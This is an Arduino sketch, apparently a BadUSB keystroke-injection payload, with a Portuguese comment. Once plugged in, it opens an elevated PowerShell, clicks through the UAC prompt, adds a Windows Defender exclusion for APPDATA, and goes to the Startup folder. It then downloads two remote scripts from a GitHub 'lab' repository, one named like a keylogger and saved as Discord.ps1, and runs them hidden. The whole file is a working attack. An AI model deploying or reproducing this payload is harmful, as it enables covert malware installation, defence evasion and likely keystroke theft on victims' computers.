#include <HID.h>
#include <Keyboard.h>

void setup() {
  Keyboard.begin();

  delay(1000);

  // 1. Pressionar a tecla Windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  delay(1000);
  Keyboard.releaseAll();
  delay(500);


  Keyboard.print("powershell Start-Process powershell -Verb RunAs");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  delay(500);
  Keyboard.write(121);
  delay(1000);
  Keyboard.releaseAll();
  delay(1000);


  Keyboard.print("Set-WinUserLanguageList en-US -Force");
  delay(1000);
  Keyboard.write(KEY_RETURN);
  delay(1000);


  Keyboard.print("cd \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(500);
  Keyboard.print("Add-MpPreference -ExclusionPath $env:APPDATA");
  Keyboard.write(KEY_RETURN);  
  delay(500);
  Keyboard.print("Invoke-WebRequest -Uri https://raw.githubusercontent.com/brunosmassa/lab/refs/heads/main/localkl.txt -OutFile Discord.ps1 | powershell Start-Process powershell -Verb RunAs | powershell -WindowStyle Hidden .\\Discord.ps1");
  Keyboard.write(KEY_RETURN);
  delay(2000);
  Keyboard.print("Invoke-WebRequest -Uri https://raw.githubusercontent.com/brunosmassa/lab/refs/heads/main/SentLoop -OutFile loop.ps1 | powershell -WindowStyle Hidden .\\loop.ps1");
  Keyboard.write(KEY_RETURN);
  delay(500);

  while(true) {
  }
}
